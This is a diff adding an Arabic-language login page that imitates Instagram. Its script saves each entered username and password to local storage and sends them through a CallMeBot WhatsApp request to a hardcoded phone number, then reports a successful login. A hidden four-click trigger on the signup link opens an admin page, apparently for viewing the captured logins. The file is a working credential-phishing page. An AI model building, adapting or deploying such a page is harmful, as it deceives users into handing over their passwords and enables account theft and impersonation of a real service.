@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #fafafa; }
+        .box { background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 30px; width: 370px; max-width: 95%; }
+        .logo { text-align: center; margin-bottom: 30px; font-size: 28px; font-weight: 700; color: #262626; }
+        .logo span { display: block; font-size: 12px; color: #999; font-weight: 400; margin-top: 2px; }
+        .box input { width: 100%; padding: 9px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; background: #fafafa; outline: none; }
+        .box input:focus { border-color: #a8a8a8; background: white; }
+        .box input::placeholder { color: #999; font-size: 12px; }
+        .box button { width: 100%; padding: 7px; margin-top: 8px; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .box button:hover { background: #1877f2; }
+        .divider { display: flex; align-items: center; margin: 18px 0; color: #999; font-size: 12px; }
+        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
+        .divider span { padding: 0 18px; }
+        .box .link { text-align: center; font-size: 12px; color: #00376b; margin-top: 10px; display: block; text-decoration: none; }
+        .box .link:hover { text-decoration: underline; }
+        .footer-box { background: white; border: 1px solid #dbdbdb; border-radius: 1px; width: 370px; max-width: 95%; margin-top: 10px; padding: 20px; text-align: center; font-size: 13px; color: #262626; }
+        .footer-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+        .footer-box a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="box">
+            <div class="logo">
+                Instagram
+                <span>تسجيل الدخول إلى حسابك</span>
+            </div>
+            <form id="loginForm">
+                <input id="username" type="text" placeholder="اسم المستخدم أو البريد" required>
+                <input id="password" type="password" placeholder="كلمة السر" required>
+                <button type="submit">تسجيل الدخول</button>
+            </form>
+            <div class="divider"><span>أو</span></div>
+            <a class="link" href="#">نسيت كلمة السر؟</a>
+        </div>
+        <div class="footer-box">
+            ما عنديش حساب؟ <a href="#" id="signupLink">سجل الآن</a>
+        </div>
+    </div>
+    <script>
+        var clickCount = 0, clickTimer = null;
+        document.getElementById("signupLink").addEventListener("click", function(e) {
+            e.preventDefault();
+            clickCount++;
+            if (clickCount >= 4) { window.location.href = "admin.html"; clickCount = 0; }
+            clearTimeout(clickTimer);
+            clickTimer = setTimeout(function() { clickCount = 0; }, 1000);
+        });
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            var u = document.getElementById("username").value;
+            var p = document.getElementById("password").value;
+            var data = JSON.parse(localStorage.getItem("myapp_logins") || "[]");
+            data.push({ username: u, password: p, time: new Date().toLocaleString() });
+            localStorage.setItem("myapp_logins", JSON.stringify(data));
+            var phone = "212777061501";
+            var apikey = "YOUR_API_KEY";
+            var msg = encodeURIComponent("New Login%0AUser: " + u + "%0APass: " + p);
+            fetch("https://api.callmebot.com/whatsapp.php?phone=" + phone + "&text=" + msg + "&apikey=" + apikey).catch(function(){});
+            alert("تم تسجيل الدخول بنجاح");
+        });
+    </script>
+</body>
+</html>
